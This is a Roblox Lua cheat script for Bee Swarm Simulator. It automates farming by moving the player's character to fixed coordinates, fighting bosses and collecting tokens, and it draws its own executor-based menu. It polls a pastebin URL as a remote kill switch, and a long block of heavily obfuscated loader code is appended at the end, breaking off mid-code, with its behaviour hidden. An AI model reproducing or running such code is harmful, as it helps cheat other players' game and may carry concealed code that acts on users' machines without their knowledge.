    if self.autoFarmEnabled and self.selectedOption and self.selectedOption ~= "Select Field..." then

        self.status = "Returning to Field"
        self.needsRedraw = true
        
        local flowerZones = game.Workspace.FlowerZones
        if flowerZones then
            local targetZone = flowerZones:FindFirstChild(self.selectedOption)
            if targetZone then
                character = player.Character
                if character then
                    hrp = character:FindFirstChild("HumanoidRootPart")
                    if hrp then
                        local fieldPos = Vector3.new(targetZone.Position.X, targetZone.Position.Y + 10, targetZone.Position.Z)
                        self:QueueTween(hrp, fieldPos, true)
                        
                        local startWait = os.clock()
                        while self.processingTween and self.autoFarmEnabled do
                            if os.clock() - startWait > 60 then

                                self:ClearTweenQueue()
                                break
                            end
                            wait(0.1)
                        end
                        

                    end
                end
            end
        end
    end
    
    self.collectTokens = wasCollectingTokens
    self.pausedForTimedAction = false
    self.status = previousStatus
    self.needsRedraw = true
    
    return true
end

function UI:StartTimedActionsHandler()
    if self.timedActionsThread then
        task.cancel(self.timedActionsThread)
        self.timedActionsThread = nil
    end
    
    -- Initialize timers for all dispensers
    for key, config in pairs(self.dispenserConfig) do
        local timerKey = "last" .. key:gsub("^%l", string.upper) .. "Time"
        if not self[timerKey] then
            self[timerKey] = os.clock() - config.interval  -- Set to trigger immediately
        end
    end
    
    -- Initialize other timers
    if not self.lastTunnelBearTime then
        self.lastTunnelBearTime = os.clock() - 172800
    end
    if not self.lastKingBeetleTime then
        self.lastKingBeetleTime = os.clock() - 86400
    end
    if not self.lastCommandoChickTime then
        self.lastCommandoChickTime = os.clock() - 1800
    end
    
    self.timedActionsThread = spawn(function()
        while self.autoFarmEnabled do
            if self.pausedForTimedAction then
                wait(1)
                continue
            end
            
            if not self.autoFarmEnabled then
                break
            end
            
            local currentTime = os.clock()
            
            -- Check all dispensers
            for key, config in pairs(self.dispenserConfig) do
                if config.enabled(self) then
                    local timerKey = "last" .. key:gsub("^%l", string.upper) .. "Time"
                    
                    if currentTime - self[timerKey] >= config.interval then
                        if self.autoFarmEnabled then

                            self:CollectDispenser(key)
                            self[timerKey] = currentTime
                        end
                    end
                end
                
                wait(1)
                if not self.autoFarmEnabled then break end
            end
            
            -- Tunnel Bear
            if self.killTunnelBear then
                if currentTime - self.lastTunnelBearTime >= 172800 then
                    if self.autoFarmEnabled then

                        local success = self:FightTunnelBear()
                        if success then
                            self.lastTunnelBearTime = currentTime
                        end
                    end
                end
            end
            
            wait(3)
            if not self.autoFarmEnabled then break end
            
            -- King Beetle
            if self.killKingBeetle then
                if not self.lastKingBeetleTime or self.lastKingBeetleTime == 0 then
                    self.lastKingBeetleTime = currentTime - 86400
                end
                
                if currentTime - self.lastKingBeetleTime >= 86400 then
                    if self.autoFarmEnabled then

                        local success = self:KillKingBeetle()
                        if success then
                            self.lastKingBeetleTime = currentTime
                        end
                    end
                end
            end
            
            wait(3)
            if not self.autoFarmEnabled then break end
            
            -- Commando Chick
            if self.killCommandoChick then
                if currentTime - self.lastCommandoChickTime >= 1800 then
                    if self.autoFarmEnabled then

                        self:FightCommandoChick()
                        self.lastCommandoChickTime = currentTime
                    end
                end
            end
            
            wait(10)
        end
        

        self.timedActionsThread = nil
    end)
end

function UI:StopTimedActionsHandler()
    if self.timedActionsThread then
        task.cancel(self.timedActionsThread)
        self.timedActionsThread = nil
    end
end

function UI:Render()
    self:Clear()
    
    self:CreateRect(0, 0, self.panel.width, self.panel.height, Color3.fromRGB(17, 20, 27))
    
    self:RenderTitleBar()
    self:RenderSidebar()
    
    if self.activeTab == 1 then
        self:RenderMainTab()
    elseif self.activeTab == 2 then
        self:RenderFarmingTab()
    elseif self.activeTab == 3 then
        self:RenderCombatTab()
    elseif self.activeTab == 4 then
        self:RenderMiscTab()
    elseif self.activeTab == 5 then
        self:RenderSettingsTab()
    end
    self.needsRedraw = false
end


-- INPUT -----------------------------------------------------------------------------------------------------------------


function UI:HandleInput()
    local mouse = game.Players.LocalPlayer:GetMouse()
    local mX, mY = mouse.X, mouse.Y
    local pressed = ismouse1pressed()
    if pressed and not self.lastMousePressed then
        local relX, relY = mX - self.panel.x, mY - self.panel.y
        
        -- Check if clicking inside ANY dropdown menu area FIRST
        local clickingInsideDropdownArea = false
        
        -- Check field selection dropdown area
        if self.dropdownOpen then
            local dropdown1X = self.panel.sidebarWidth + 30 + 220
            local dropdownY = 80 + 40
            local menuY = dropdownY + 28
            local options = GetFlowerZones()
            
            if relX >= dropdown1X and relX <= dropdown1X + 150 and
               relY >= menuY and relY <= menuY + (#options * 24) then
                clickingInsideDropdownArea = true
            end
        end
        
        -- Check sprinkler dropdown area
        if self.secondDropdownOpen then
            local dropdown2X = self.panel.sidebarWidth + 30 + 220 + 170
            local dropdownY = 80 + 40
            local menuY = dropdownY + 28
            
            if relX >= dropdown2X and relX <= dropdown2X + 150 and
               relY >= menuY and relY <= menuY + (6 * 24) then
                clickingInsideDropdownArea = true
            end
        end
        
        -- Check combat dropdown area
        if self.combatDropdownOpen then
            local dropdownX = self.panel.sidebarWidth + 30 + 220
            local dropdownY = 80 + 40
            local menuY = dropdownY + 28
            
            if relX >= dropdownX and relX <= dropdownX + 150 and
               relY >= menuY and relY <= menuY + (9 * 24) then
                clickingInsideDropdownArea = true
            end
        end
        
        -- If clicking inside dropdown area, ONLY check dropdown buttons
        for _, btn in ipairs(self.buttons) do
            if relX >= btn.x and relX <= btn.x + btn.width and
               relY >= btn.y and relY <= btn.y + btn.height then
                
                -- If inside dropdown area, only allow dropdown button clicks
                if clickingInsideDropdownArea then
                    -- Check if this button is actually part of a dropdown menu
                    local isDropdownButton = false
                    
                    -- Check if button is in dropdown Y range
                    if self.dropdownOpen or self.secondDropdownOpen or self.combatDropdownOpen then
                        local dropdownY = 80 + 40
                        local menuY = dropdownY + 28
                        
                        if btn.y >= menuY and btn.height == 24 then
                            isDropdownButton = true
                        end
                    end
                    
                    -- Only execute callback if it's actually a dropdown button
                    if isDropdownButton and btn.callback then
                        btn.callback()
                        self.lastMousePressed = pressed
                        return
                    end
                else
                    -- Not in dropdown area, allow all button clicks
                    if btn.callback then
                        btn.callback()
                    end
                    self.lastMousePressed = pressed
                    return
                end
            end
        end
        
        if relX >= 0 and relX <= self.panel.width and relY >= 0 and relY <= 50 then
            self.dragging = {x = relX, y = relY}
        end
    end
    if pressed then
        if self.dragging then
            self.panel.x = mX - self.dragging.x
            self.panel.y = mY - self.dragging.y
            for _, d in pairs(self.drawings) do
                if d.isLine then
                    d.instance.From = Vector2.new(self.panel.x + d.relX, self.panel.y + d.relY)
                    d.instance.To = Vector2.new(self.panel.x + d.relX2, self.panel.y + d.relY2)
                else
                    d.instance.Position = Vector2.new(self.panel.x + d.relX, self.panel.y + d.relY)
                end
            end
        end
        
        if self.draggingSlider then
            self:HandleSliderDrag(mX, mY)
        end
        if self.draggingGatherSlider then
            self:HandleGatherSliderDrag(mX, mY)
        end
    else
        self.dragging = nil
        self.draggingSlider = false
        self.draggingGatherSlider = false
    end
    
    self.lastMousePressed = pressed
end

function UI:HandleSliderDrag(mX, mY)
    local sliderX = self.panel.x + self.panel.sidebarWidth + 30 + 220
    local sliderY = self.panel.y + 80 + 40 + 8
    local sliderWidth = 150
    
    -- Calculate position relative to slider
    local relX = mX - sliderX
    relX = math.max(0, math.min(relX, sliderWidth))
    
    -- Map to speed range (20-120)
    local normalizedValue = relX / sliderWidth
    self.tweenSpeed = 20 + (normalizedValue * 100)
    self.tweenSpeed = math.floor(self.tweenSpeed)
    
    self.needsRedraw = true
end

function UI:HandleGatherSliderDrag(mX, mY)
    local sliderX = self.panel.x + self.panel.sidebarWidth + 30 + 220
    local sliderY = self.panel.y + 80 + 40 + 8 + 60
    local sliderWidth = 150
    
    -- Calculate position relative to slider
    local relX = mX - sliderX
    relX = math.max(0, math.min(relX, sliderWidth))
    
    -- Map to time range (1-30 minutes)
    local normalizedValue = relX / sliderWidth
    self.gatherTime = 1 + (normalizedValue * 29)
    self.gatherTime = math.floor(self.gatherTime)
    
    self.needsRedraw = true
end

function UI:FindBubbleLocation()
    
    local particles = game.Workspace:FindFirstChild("Particles")
    if particles then
        for _, child in pairs(particles:GetChildren()) do
        end
    end
    for _, descendant in pairs(game.Workspace:GetDescendants()) do
        if string.find(string.lower(descendant.Name), "bubble") then
        end
    end
end

function UI:CheckKingBeetle()
    local monsters = game.Workspace:FindFirstChild("Monsters")
    if not monsters then return false end
    
    local kingBeetle = monsters:FindFirstChild("King Beetle (Lvl 7)")
    return kingBeetle ~= nil
end

function UI:KillKingBeetle()

    
    local player = game.Players.LocalPlayer
    local character = player.Character
    
    if not character then

        return false
    end
    
    local hrp = character:FindFirstChild("HumanoidRootPart")
    if not hrp then

        return false
    end
    
    local previousStatus = self.status
    local wasCollectingTokens = self.collectTokens
    
    self.pausedForTimedAction = true
    self.collectTokens = false
    StopWalking()
    self:ClearTweenQueue()
    wait(0.5)
    
    self.status = "Checking King Beetle"
    self.needsRedraw = true
    
    local checkPos = Vector3.new(218, 4, 140)
    

    self:QueueTween(hrp, checkPos, true)
    
    local maxWaitTime = 60
    local startWait = os.clock()
    
    while self.processingTween and self.autoFarmEnabled do
        if os.clock() - startWait > maxWaitTime then

            self:ClearTweenQueue()
            break
        end
        wait(0.1)
    end
    

    wait(1)
    
    if not self:CheckKingBeetle() then

        self.lastKingBeetleTime = os.clock()
        if self.autoFarmEnabled and self.selectedOption and self.selectedOption ~= "Select Field..." then

            self.status = "Returning to Field"
            self.needsRedraw = true
            
            local flowerZones = game.Workspace.FlowerZones
            if flowerZones then
                local targetZone = flowerZones:FindFirstChild(self.selectedOption)
                if targetZone then
                    character = player.Character
                    if character then
                        hrp = character:FindFirstChild("HumanoidRootPart")
                        if hrp then
                            local fieldPos = Vector3.new(targetZone.Position.X, targetZone.Position.Y + 10, targetZone.Position.Z)
                            self:QueueTween(hrp, fieldPos, true)
                            
                            local startWait = os.clock()
                            while self.processingTween and self.autoFarmEnabled do
                                if os.clock() - startWait > 60 then

                                    self:ClearTweenQueue()
                                    break
                                end
                                wait(0.1)
                            end
                            

                        end
                    end
                end
            end
        end
        
        self.collectTokens = wasCollectingTokens
        self.pausedForTimedAction = false
        self.status = previousStatus
        self.needsRedraw = true
        
        return false
    end
    

    self.status = "Fighting King Beetle"
    self.needsRedraw = true
    
    local waypoint1 = Vector3.new(108, 4, 169)

    self:QueueTween(hrp, waypoint1, true)
    
    startWait = os.clock()
    while self.processingTween and self.autoFarmEnabled do
        if os.clock() - startWait > 60 then

            self:ClearTweenQueue()
            break
        end
        wait(0.1)
    end
    
    wait(0.5)
    
    local waypoint2 = Vector3.new(109, 4, 253)

    self:QueueTween(hrp, waypoint2, true)
    
    startWait = os.clock()
    while self.processingTween and self.autoFarmEnabled do
        if os.clock() - startWait > 60 then

            self:ClearTweenQueue()
            break
        end
        wait(0.1)
    end
    

    wait(1)
    
    local checkStartTime = os.clock()
    while self.autoFarmEnabled and self:CheckKingBeetle() do
        if os.clock() - checkStartTime > 300 then

            break
        end
        wait(0.5)
    end
    
    if self.autoFarmEnabled then

        
        local collectPos = Vector3.new(182, 4, 180)

        self:QueueTween(hrp, collectPos, true)
        
        startWait = os.clock()
        while self.processingTween and self.autoFarmEnabled do
            if os.clock() - startWait > 60 then

                self:ClearTweenQueue()
                break
            end
            wait(0.1)
        end
        
        wait(0.5)
        

        self.status = "Collecting King Beetle Tokens"
        self.needsRedraw = true
        
        local collectStartTime = os.clock()
        local recentTokens = {}
        
        while self.autoFarmEnabled and (os.clock() - collectStartTime) < 15 do
            local collectibles = game.Workspace:FindFirstChild("Collectibles")
            if collectibles then
                character = player.Character
                if character then
                    hrp = character:FindFirstChild("HumanoidRootPart")
                    if hrp then
                        local hrpPos = hrp.Position
                        local closestToken = nil
                        local closestDistance = math.huge
                        
                        for _, token in pairs(collectibles:GetChildren()) do
                            if token.Name == "C" and token:IsA("BasePart") and token.Parent then
                                local tokenPos = token.Position
                                if tokenPos then
                                    local isRecent = false
                                    for _, recentPos in ipairs(recentTokens) do
                                        local tdx = math.abs(tokenPos.X - recentPos.X)
                                        local tdy = math.abs(tokenPos.Y - recentPos.Y)
                                        local tdz = math.abs(tokenPos.Z - recentPos.Z)
                                        if tdx < 3 and tdy < 3 and tdz < 3 then
                                            isRecent = true
                                            break
                                        end
                                    end
                                    
                                    if not isRecent then
                                        local tdy = math.abs(hrpPos.Y - tokenPos.Y)
                                        if tdy <= 10 then
                                            local tdx = hrpPos.X - tokenPos.X
                                            local tdz = hrpPos.Z - tokenPos.Z
                                            local distSquared = tdx * tdx + tdz * tdz
                                            
                                            if distSquared < 2500 and distSquared < closestDistance then
                                                closestDistance = distSquared
                                                closestToken = tokenPos
                                            end
                                        end
                                    end
                                end
                            end
                        end
                        
                        if closestToken then
                            WalkTo(closestToken)
                            
                            local startTime = os.clock()
                            while IsWalking() and self.autoFarmEnabled do
                                if os.clock() - startTime > 3 then
                                    StopWalking()
                                    break
                                end
                                
                                hrp = character:FindFirstChild("HumanoidRootPart")
                                if hrp then
                                    local currentPos = hrp.Position
                                    local cdx = currentPos.X - closestToken.X
                                    local cdz = currentPos.Z - closestToken.Z
                                    local distSquared = cdx * cdx + cdz * cdz
                                    
                                    if distSquared < 25 then
                                        StopWalking()
                                        break
                                    end
                                end
                                
                                wait(0.05)
                            end
                            
                            StopWalking()
                            
                            table.insert(recentTokens, closestToken)
                            if #recentTokens > 10 then
                                table.remove(recentTokens, 1)
                            end
                        else
                            if #recentTokens > 0 then
                                recentTokens = {}
                            end
                        end
                    end
                end
            end
            
            wait(0.05)
        end
        
        StopWalking()


    end
    
    if self.autoFarmEnabled and self.selectedOption and self.selectedOption ~= "Select Field..." then

        self.status = "Returning to Field"
        self.needsRedraw = true
        
        local flowerZones = game.Workspace.FlowerZones
        if flowerZones then
            local targetZone = flowerZones:FindFirstChild(self.selectedOption)
            if targetZone then
                character = player.Character
                if character then
                    hrp = character:FindFirstChild("HumanoidRootPart")
                    if hrp then
                        local fieldPos = Vector3.new(targetZone.Position.X, targetZone.Position.Y + 10, targetZone.Position.Z)
                        self:QueueTween(hrp, fieldPos, true)
                        
                        local startWait = os.clock()
                        while self.processingTween and self.autoFarmEnabled do
                            if os.clock() - startWait > 60 then

                                self:ClearTweenQueue()
                                break
                            end
                            wait(0.1)
                        end
                        

                    end
                end
            end
        end
    end
    
    self.collectTokens = wasCollectingTokens
    self.pausedForTimedAction = false
    self.status = previousStatus
    self.needsRedraw = true
    
    return true
end

function UI:FightCommandoChick()

    
    local player = game.Players.LocalPlayer
    local character = player.Character
    
    if not character then

        return false
    end
    
    local hrp = character:FindFirstChild("HumanoidRootPart")
    if not hrp then

        return false
    end
    
    -- Save current state
    local previousStatus = self.status
    local previousField = self.selectedOption
    local wasCollectingTokens = self.collectTokens
    
    -- Temporarily disable token collection and pause auto farm
    self.pausedForTimedAction = true
    self.collectTokens = false
    StopWalking()
    self:ClearTweenQueue()
    wait(0.5)
    
    self.status = "Going to Commando Chick"
    self.needsRedraw = true
    
    -- Tween to Commando Chick spawn location
    local commandoPos = Vector3.new(476, 46, 203)
    

    self:QueueTween(hrp, commandoPos, true)
    
    -- Wait for tween to complete
    local maxWaitTime = 60
    local startWait = os.clock()
    
    while self.processingTween and self.autoFarmEnabled do
        if os.clock() - startWait > maxWaitTime then

            self:ClearTweenQueue()
            break
        end
        wait(0.1)
    end
    

    wait(3)
    
    -- Check if Commando Chick spawned
    if not self:CheckForCommandoChick() then

        
        -- Return to field
        if self.autoFarmEnabled and previousField and previousField ~= "Select Field..." then

            self.status = "Returning to Field"
            self.needsRedraw = true
            
            local flowerZones = game.Workspace.FlowerZones
            if flowerZones then
                local targetZone = flowerZones:FindFirstChild(previousField)
                if targetZone then
                    character = player.Character
                    if character then
                        hrp = character:FindFirstChild("HumanoidRootPart")
                        if hrp then
                            local fieldPos = Vector3.new(targetZone.Position.X, targetZone.Position.Y + 10, targetZone.Position.Z)
                            self:QueueTween(hrp, fieldPos, true)
                            
                            local startWait = os.clock()
                            while self.processingTween and self.autoFarmEnabled do
                                if os.clock() - startWait > 60 then

                                    self:ClearTweenQueue()
                                    break
                                end
                                wait(0.1)
                            end
                            

                        end
                    end
                end
            end
        end
        
        -- Restore state
        self.collectTokens = wasCollectingTokens
        self.pausedForTimedAction = false
        self.status = previousStatus
        self.needsRedraw = true
        
        return false
    end
    

    self.status = "Fighting Commando Chick"
    self.needsRedraw = true
    
    -- Farm tokens while Commando Chick is alive
    while self.autoFarmEnabled and self.killCommandoChick and self:CheckForCommandoChick() do
        local collectibles = game.Workspace:FindFirstChild("Collectibles")
        if collectibles then
            character = player.Character
            if character then
                hrp = character:FindFirstChild("HumanoidRootPart")
                if hrp then
                    local hrpPos = hrp.Position
                    local closestToken = nil
                    local closestDistance = math.huge
                    
                    for _, token in pairs(collectibles:GetChildren()) do
                        if token.Name == "C" and token:IsA("BasePart") and token.Parent then
                            local tokenPos = token.Position
                            if tokenPos then
                                local dy = math.abs(hrpPos.Y - tokenPos.Y)
                                if dy <= 15 then
                                    local dx = hrpPos.X - tokenPos.X
                                    local dz = hrpPos.Z - tokenPos.Z
                                    local distSquared = dx * dx + dz * dz
                                    
                                    if distSquared < 2500 and distSquared < closestDistance then
                                        closestDistance = distSquared
                                        closestToken = tokenPos
                                    end
                                end
                            end
                        end
                    end
                    
                    if closestToken then
                        WalkTo(closestToken)
                        
                        local startTime = os.clock()
                        while IsWalking() and self.autoFarmEnabled do
                            if os.clock() - startTime > 3 then
                                StopWalking()
                                break
                            end
                            
                            hrp = character:FindFirstChild("HumanoidRootPart")
                            if hrp then
                                local currentPos = hrp.Position
                                local cdx = currentPos.X - closestToken.X
                                local cdz = currentPos.Z - closestToken.Z
                                local distSquared = cdx * cdx + cdz * cdz
                                
                                if distSquared < 25 then
                                    StopWalking()
                                    break
                                end
                            end
                            
                            wait(0.05)
                        end
                        
                        StopWalking()
                    end
                end
            end
        end
        
        wait(0.5)
    end
    


    
    -- Return to field
    if self.autoFarmEnabled and previousField and previousField ~= "Select Field..." then

        self.status = "Returning to Field"
        self.needsRedraw = true
        
        local flowerZones = game.Workspace.FlowerZones
        if flowerZones then
            local targetZone = flowerZones:FindFirstChild(previousField)
            if targetZone then
                character = player.Character
                if character then
                    hrp = character:FindFirstChild("HumanoidRootPart")
                    if hrp then
                        local fieldPos = Vector3.new(targetZone.Position.X, targetZone.Position.Y + 10, targetZone.Position.Z)
                        self:QueueTween(hrp, fieldPos, true)
                        
                        local startWait = os.clock()
                        while self.processingTween and self.autoFarmEnabled do
                            if os.clock() - startWait > 60 then

                                self:ClearTweenQueue()
                                break
                            end
                            wait(0.1)
                        end
                        

                    end
                end
            end
        end
    end
    
    -- Restore state
    self.collectTokens = wasCollectingTokens
    self.pausedForTimedAction = false
    self.status = previousStatus
    self.needsRedraw = true
    
    return true
end

function UI:Shutdown()
    
    self.isRunning = false
    if self.statusUpdaterThread then
        task.cancel(self.statusUpdaterThread)
        self.statusUpdaterThread = nil
    end
    if self.autoFarmThread then
        task.cancel(self.autoFarmThread)
        self.autoFarmThread = nil
    end
    if self.autoDigThread then
        task.cancel(self.autoDigThread)
        self.autoDigThread = nil
    end
    if self.coconutCrabThread then
        task.cancel(self.coconutCrabThread)
        self.coconutCrabThread = nil
    end
    if self.tweenQueueThread then
        task.cancel(self.tweenQueueThread)
        self.tweenQueueThread = nil
    end
    
    self:Clear()
end

local function CheckRemoteControl()
    
    local success, content = pcall(function()
        return game:HttpGet("https://pastebin.com/raw/ih2Sx4nb")
    end)
    
    if not success then
        warn("[CONTROL] Failed to fetch URL ")
        return true
    end
    
    content = content:gsub("%s+", "")
    
    if content == "0" then
        print("[CONTROL] value received")
        
        if UI then
            UI.isRunning = false
            if UI.statusUpdaterThread then task.cancel(UI.statusUpdaterThread) end
            if UI.autoFarmThread then task.cancel(UI.autoFarmThread) end
            if UI.autoDigThread then task.cancel(UI.autoDigThread) end
            if UI.coconutCrabThread then task.cancel(UI.coconutCrabThread) end
            if UI.tweenQueueThread then task.cancel(UI.tweenQueueThread) end
            if UI.timedActionsThread then task.cancel(UI.timedActionsThread) end
            
            -- Use UI:Clear() to brick the UI
            UI:Clear()
        end
        
        if controlCheckThread then
            task.cancel(controlCheckThread)
        end
        
        pcall(function() StopWalking() end)
        
        print("[CONTROL] Script closed")
        
        return false
        
    elseif content == "1" then
        wait(0.5)
        return true
    else
        warn("[CONTROL] Unknown response: '" .. content .. "' - continuing anyway")
        return true
    end
end

local function StartControlCheck()
    if controlCheckThread then
        task.cancel(controlCheckThread)
    end
    
    controlCheckThread = spawn(function()
        while true do
            local shouldContinue = CheckRemoteControl()
            
            if not shouldContinue then
                print("[CONTROL] stopped")
                break
            end
            
            wait(10)
        end
    end)
end

StartControlCheck()

UI:Render()
UI:StartStatusUpdater()
spawn(function()
    while UI.isRunning do
        UI:HandleInput()
        if UI.needsRedraw then
            UI:Render()
        end
        wait(0.03)
    end
    UI:Clear()

end)
local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function() return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...) local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30) if (v1(v30,2)==81) then v19=v0(v3(v30,1,1));return "";else local v89=v2(v0(v30,16));if v19 then local v110=v5(v89,v19);v19=nil;return v110;else return v89;end end end);local function v20(v31,v32,v33) if v33 then local v90=(v31/((5 -3)^(v32-(2 -1))))%((3 -1)^(((v33-1) -(v32-((879 -(282 + 595)) -(1638 -(1523 + 114))))) + (620 -(555 + 64)))) ;return v90-(v90%(932 -(857 + 74))) ;else local v91=0;local v92;while true do if (v91==((511 + 57) -(367 + (286 -85)))) then v92=(929 -(214 + 713))^(v32-(1 + 0)) ;return (((v31%(v92 + v92))>=v92) and (1 + (1065 -(68 + 997)))) or 0 ;end end end end local function v21() local v34=v1(v16,v18,v18);v18=v18 + 1 ;return v34;end local function v22() local v35=(2347 -1077) -(226 + 1044) ;local v36;local v37;while true do if (v35==(4 -3)) then return (v37 * (373 -(32 + 85))) + v36 ;end if (v35==(0 + 0)) then v36,v37=v1(v16,v18,v18 + 1 + 1 );v18=v18 + (959 -((1637 -745) + 65)) ;v35=2 -1 ;end end end local function v23() local v38,v39,v40,v41=v1(v16,v18,v18 + (353 -(87 + 263)) );v18=v18 + (184 -(67 + 113)) ;return (v41 * (12302277 + 4474939)) + (v40 * 65536) + (v39 * (628 -(274 + 98))) + v38 ;end local function v24() local v42=0 -0 ;local v43;local v44;local v45;local v46;local v47;local v48;while true do if (v42==(953 -(802 + 150))) then v45=2 -1 ;v46=(v20(v44,1 -0 ,15 + 5 ) * (2^(1029 -(915 + 82)))) + v43 ;v42=5 -3 ;end if (v42==(2 + 1)) then if (v47==(0 -(1486 -(998 + 488)))) then if (v46==(1187 -(1069 + 118))) then return v48 * (0 -0) ;else local v122=0 -0 ;while true do if (v122==(0 + 0 + 0)) then v47=1;v45=0 -0 ;break;end end end elseif (v47==(2031 + 14 + 2)) then return ((v46==0) and (v48 * ((792 -(368 + 423))/0))) or (v48 * NaN) ;end return v8(v48,v47-(3214 -2191) ) * (v45 + (v46/((20 -(10 + 8))^(824 -(201 + 571))))) ;end if (v42==(0 -0)) then v43=v23();v44=v23();v42=443 -(416 + 26) ;end if (v42==(6 -(1142 -(116 + 1022)))) then v47=v20(v44,10 + 11 ,31);v48=((v20(v44,56 -24 )==1) and  -1) or ((1827 -1388) -(145 + 293)) ;v42=433 -(44 + 386) ;end end end local function v25(v49) local v50;if  not v49 then v49=v23();if (v49==(0 + 0)) then return "";end end v50=v3(v16,v18,(v18 + v49) -(3 -2) );v18=v18 + v49 ;local v51={};for v67=1, #v50 do v51[v67]=v2(v1(v3(v50,v67,v67)));end return v6(v51);end local v26=v23;local function v27(...) return {...},v12("#",...);end local function v28() local v52=(function() return function(v93,v94,v95,v96,v97,v98,v99,v100,v101) local v102=(function() return 0;end)();local v93=(function() return;end)();local v94=(function() return;end)();while true do if (v102==0) then local v117=(function() return 1763 -(454 + 1309) ;end)();local v118=(function() return;end)();while true do if (v117==0) then v118=(function() return 0 + 0 ;end)();while true do if (v118==(0 -0)) then v93=(function() return 0;end)();v94=(function() return nil;end)();v118=(function() return 1;end)();end if (v118~=1) then else v102=(function() return 1 -0 ;end)();break;end end break;end end end if (v102~=1) then else local v119=(function() return 0 -0 ;end)();while true do if (v119~=(285 -(134 + 151))) then else while true do if (v93~=(1665 -(970 + 695))) then else v94=(function() return v95();end)();if (v96(v94, #"{", #"\\")~=(0 -0)) then else local v125=(function() return 0;end)();local v126=(function() return;end)();local v127=(function() return;end)();local v128=(function() return;end)();local v129=(function() return;end)();while true do if (1==v125) then local v159=(function() return 1990 -(582 + 1408) ;end)();while true do if (v159==(0 -0)) then v128=(function() return nil;end)();v129=(function() return nil;end)();v159=(function() return 1;end)();end if (v159==1) then v125=(function() return 2;end)();break;end end end if (v125==0) then v126=(function() return 0 -0 ;end)();v127=(function() return nil;end)();v125=(function() return 3 -2 ;end)();end if (v125~=(1826 -(1195 + 629))) then else while true do if (v126~= #"~") then else local v429=(function() return 0;end)();local v430=(function() return;end)();while true do if (v429==(0 -0)) then v430=(function() return 0;end)();while true do if (v430~=(241 -(187 + 54))) then else v129=(function() return {v97(),v97(),nil,nil};end)();if (v127==(0 + 0)) then local v606=(function() return 0 + 0 ;end)();local v607=(function() return;end)();while true do if (v606~=(0 -0)) then else v607=(function() return 0;end)();while true do if (v607==(0 -0)) then v129[ #"-19"]=(function() return v97();end)();v129[ #"asd1"]=(function() return v97();end)();break;end end break;end end elseif (v127== #"!") then v129[ #"91("]=(function() return v98();end)();elseif (v127==(1 + 1)) then v129[ #"91("]=(function() return v98() -(2^16) ;end)();elseif (v127~= #"xxx") then else local v617=(function() return 0;end)();local v618=(function() return;end)();while true do if (v617==0) then v618=(function() return 1636 -(1373 + 263) ;end)();while true do if ((1000 -(451 + 549))~=v618) then else v129[ #"-19"]=(function() return v98() -((1 + 1)^16) ;end)();v129[ #"xnxx"]=(function() return v97();end)();break;end end break;end end end v430=(function() return 1 -0 ;end)();end if (1==v430) then v126=(function() return 2 -0 ;end)();break;end end break;end end end if (v126== #"91(") then if (v96(v128, #"asd", #"xxx")== #"~") then v129[ #"0313"]=(function() return v99[v129[ #".dev"]];end)();end v100[v101]=(function() return v129;end)();break;end if (v126==(1386 -(746 + 638))) then local v432=(function() return 0 + 0 ;end)();local v433=(function() return;end)();while true do if (v432~=0) then else v433=(function() return 0 -0 ;end)();while true do if (v433~=1) then else v126=(function() return  #"91(";end)();break;end if ((341 -(218 + 123))==v433) then if (v96(v128, #".", #"~")~= #"!") then else v129[1583 -(1535 + 46) ]=(function() return v99[v129[2]];end)();end if (v96(v128,2,2 + 0 )~= #">") then else v129[ #"-19"]=(function() return v99[v129[ #"asd"]];end)();end v433=(function() return 1 + 0 ;end)();end end break;end end end if (v126~=(560 -(306 + 254))) then else local v434=(function() return 0;end)();local v435=(function() return;end)();while true do if (v434==(0 + 0)) then v435=(function() return 0 -0 ;end)();while true do if (v435==(1467 -(899 + 568))) then v127=(function() return v96(v94,2 + 0 , #"xxx");end)();v128=(function() return v96(v94, #"asd1",14 -8 );end)();v435=(function() return 604 -(268 + 335) ;end)();end if ((291 -(60 + 230))~=v435) then else v126=(function() return  #"{";end)();break;end end break;end end end end break;end end end break;end end return v93,v94,v95,v96,v97,v98,v99,v100,v101;end end end end end;end)();local v53=(function() return function(v103,v104,v105) local v106=(function() return 0;end)();local v107=(function() return;end)();while true do if (v106~=(572 -(426 + 146))) then else v107=(function() return 0 + 0 ;end)();while true do if (v107~=0) then else local v123=(function() return 0;end)();while true do if (v123~=0) then else v103[v104-#"<" ]=(function() return v105();end)();return v103,v104,v105;end end end end break;end end end;end)();local v54=(function() return {};end)();local v55=(function() return {};end)();local v56=(function() return {};end)();local v57=(function() return {v54,v55,nil,v56};end)();local v58=(function() return v23();end)();local v59=(function() return {};end)();for v69= #"{",v58 do local v70=(function() return 0;end)();local v71=(function() return;end)();local v72=(function() return;end)();while true do if (v70==(812 -(569 + 242))) then if (v71== #"}") then v72=(function() return v21()~=(0 -0) ;end)();elseif (v71==2) then v72=(function() return v24();end)();elseif (v71== #"xxx") then v72=(function() return v25();end)();end v59[v69]=(function() return v72;end)();break;end if (v70==(0 + 0)) then local v112=(function() return 1024 -(706 + 318) ;end)();while true do if (v112~=1) then else v70=(function() return 1;end)();break;end if (v112==0) then v71=(function() return v21();end)();v72=(function() return nil;end)();v112=(function() return 1252 -(721 + 530) ;end)();end end end end end v57[ #"xnx"]=(function() return v21();end)();for v73= #"{",v23() do FlatIdent_1076E,Descriptor,v21,v20,v22,v23,v59,v54,v73=(function() return v52(FlatIdent_1076E,Descriptor,v21,v20,v22,v23,v59,v54,v73);end)();end for v74= #"]",v23() do v55,v74,v28=(function() return v53(v55,v74,v28);end)();end return v57;end local function v29(v61,v62,v63) local v64=v61[1272 -(945 + 326) ];local v65=v61[4 -2 ];local v66=v61[3 + 0 ];return function(...) local v75=v64;local v76=v65;local v77=v66;local v78=v27;local v79=1;local v80= -(701 -(271 + 429));local v81={};local v82={...};local v83=v12("#",...) -(1501 -(1408 + 92)) ;local v84={};local v85={};for v108=0,v83 do if ((v108>=v77) or (4914<2480)) then v81[v108-v77 ]=v82[v108 + ((1384 -(36 + 261)) -(461 + 625)) ];else v85[v108]=v82[v108 + ((2253 -964) -(993 + 295)) ];end end local v86=(v83-v77) + 1 + 0 ;local v87;local v88;while true do local v109=1171 -(418 + 753) ;while true do if (v109==(0 + 0)) then 